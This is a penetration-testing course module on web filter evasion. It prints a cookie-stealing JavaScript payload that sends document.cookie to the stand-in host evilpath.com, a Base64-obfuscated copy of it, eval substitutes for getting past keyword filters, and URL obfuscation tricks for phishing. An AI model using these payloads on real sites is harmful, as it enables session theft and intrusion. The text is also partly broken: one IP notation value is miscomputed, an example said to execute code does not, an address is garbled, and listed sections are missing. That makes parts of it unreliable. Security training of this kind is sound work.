# Caendra Inc. © 2020
All Rights Reserved

## Web Application Penetration Testing eXtreme (WAPTXv2)

### Section 01, Module 02

**Table of Contents**
1. Base64 Encoding Evasion
2. URI Obfuscation Techniques
   - URL Shortening
   - URL Hostname Obfuscation
3. JavaScript Obfuscation Techniques
4. PHP Obfuscation Techniques

---

### Introduction & Learning Objectives

In this module, we will explore evasion techniques that can be used to circumvent web application security measures. These techniques include encoding and obfuscation methods, which have been widely utilized in web attacks over the past decade.

#### Learning Objectives
- Understand the principles of evasion techniques.
- Learn how to use Base64 encoding for evasion.
- Explore various URI obfuscation techniques.
- Discover JavaScript and PHP obfuscation methods.

---

### 2.1 Base64 Encoding Evasion

Detection systems often use regular expressions (Regex) to search for malicious strings in code. For example, a system might look for keywords like `eval`, `alert`, `prompt`, `document.cookie`, or other potentially harmful strings in JavaScript code.

To evade such filters, one effective method is to use Base64 encoding. Let's consider an example where we want to bypass a filter that inspects JavaScript code for the `document.cookie` keyword, which is commonly used in cookie-stealing payloads.

#### 2.1.1 Cookie Stealer

A typical JavaScript payload to steal cookies (not marked as HttpOnly) is:
```javascript
location.href = 'http://evilpath.com/?c=' + escape(document.cookie);
```
A Regex-based filtering system may detect the `document.cookie` keyword and block this attack vector. By using Base64 encoding, we can hide the `document.cookie` code. The encoded payload would look like this:
```javascript
eval(atob('bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk='));
```
However, the `eval` function itself may also be blacklisted. Here are some alternative methods to parse a string as JavaScript:

- `[].constructor.constructor("code")()`
- `setTimeout("code")` (all browsers)
- `setInterval("code")` (all browsers)
- `setImmediate("code")` (IE 10+)
- `Function("code")()` (all browsers)

For example, the following code uses the `atob` function to decode and execute the Base64-encoded string:
```javascript
atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk=");
```

---

### 2.2 URI Obfuscation Techniques

URIs (Uniform Resource Identifiers) are essential for web navigation and communication. They provide a standardized way to identify resources, both locally and remotely. In some cases, social engineering is required to exploit vulnerabilities, making URI obfuscation a valuable technique. It can help bypass filtered systems and shorten URLs to meet character limits.

#### 2.2.1 URL Shortening

URL shortening is a technique that reduces the length of a URL while still directing it to the same page. This is typically achieved using an HTTP Redirect (301 Moved Permanently) header. For example, a long URL can be shortened using services like Google URL Shortener.

##### Example: Google URL Shortener

| Long URL | Short URL |
|----------|-----------|
| https://example.com/very-long-url-with-many-parameters | http://goo.gl/abc123 |

This technique is particularly useful in messaging systems with character limits, such as Twitter, which allows a maximum of 140 characters per tweet. However, URL shortening can also be abused for illicit activities like phishing and spamming.

##### Running Your Own URL Shortener

Setting up your own URL shortener is straightforward, with many services and libraries available. Some popular options include:

- **Payment Service**: [Example Service]
- **Free and Open Source**: [Example Library]

As this technique has become a common attack vector, some service providers now offer features to preview the destination of shortened links. For example, bitly.com (bit.ly / j.mp) and managed enterprise sites like amzn.to, on.fb.me, etc., allow users to add a plus (+) after a short URL to see where it points.

##### Example: Bitly.com Short Link Info

- **Bitly.com**: `bitly.com/hack_me+`
- **Tinyurl.com**: `http://preview.tinyurl.com/ph7xh4m`
- **Tiny.cc**: `http://tiny.cc/hack_me~`

For services that do not provide this feature, such as t.co used by Twitter, online solutions like cURL can be used to resolve the URLs manually.

#### 2.2.2 URL Hostname Obfuscation

Hostname obfuscation involves representing the host component of a URI in non-standard ways. The Authority component of a URI is structured as follows:
```
[ userinfo "@" ] host [ ":" port ]
```
We can manipulate the `userinfo` and `host` subcomponents to obfuscate the URL.

##### 2.2.2.1 Obfuscating with Userinfo

The `userinfo` subcomponent is used for authentication. If no authentication is required, the text in this subcomponent is ignored by both the browser and the server. For example:
```
https://username:password@hack.me/protected_path
```
If the resource does not require authentication, the `userinfo` part is ignored. We can use this to obfuscate the URL:
```
https://PI:EMAIL@hack.me/t/xss
```

##### 2.2.2.2 Obfuscating with Host

Hostnames can be represented in various formats, such as IP addresses in different notations (Dot-decimal, Dword, Octal, Hexadecimal). For example, `google.com` can be represented as:
- **Dot-decimal Notation**: `173.194.35.23`
- **Dword Notation**: `2914336035`
- **Octal Notation**: `255.302.43.27`
- **Hexadecimal Notation**: `AD.C2.23.17`

These representations can be used to obfuscate the host component of a URI.

---

### Conclusion

Evasion techniques, including Base64 encoding and URI obfuscation, are powerful tools for bypassing web application security measures. Understanding these methods is crucial for both attackers and defenders in the ongoing battle for web security.

---

**Caendra Inc. © 2020**  
All Rights Reserved